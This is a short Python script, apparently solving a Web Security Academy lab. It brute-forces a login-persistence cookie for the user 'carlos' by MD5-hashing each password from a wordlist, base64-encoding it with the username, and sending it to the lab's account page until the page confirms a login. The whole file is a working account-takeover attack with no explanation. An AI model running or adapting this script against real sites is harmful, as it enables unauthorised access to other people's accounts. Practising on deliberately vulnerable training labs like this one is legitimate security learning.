import requests
import hashlib
import base64
with open('pass.txt', 'r') as f:
    passwords = f.readlines()

URL = "https://0ad30056047f98cf82bae7a30056001e.web-security-academy.net/my-account?id=carlos"



   
for password in passwords:
    
    password_hash = hashlib.md5(password.strip().encode()).hexdigest()
    base64_encoded = base64.b64encode(f'carlos:{password_hash}'.encode()).decode('utf-8')
    print(f"[*] Trying password: {password}")
    cookie = {
                'session': 'PKMqkqoxLUool5s0NhDmOPazWatl1W3F',
                'stay-logged-in': base64_encoded
              }
    response = requests.get(URL, cookies={'stay-logged-in': base64_encoded})
    
    if "Your username is" in response.text:
        print(f"[+] Password is: {password}")
        break
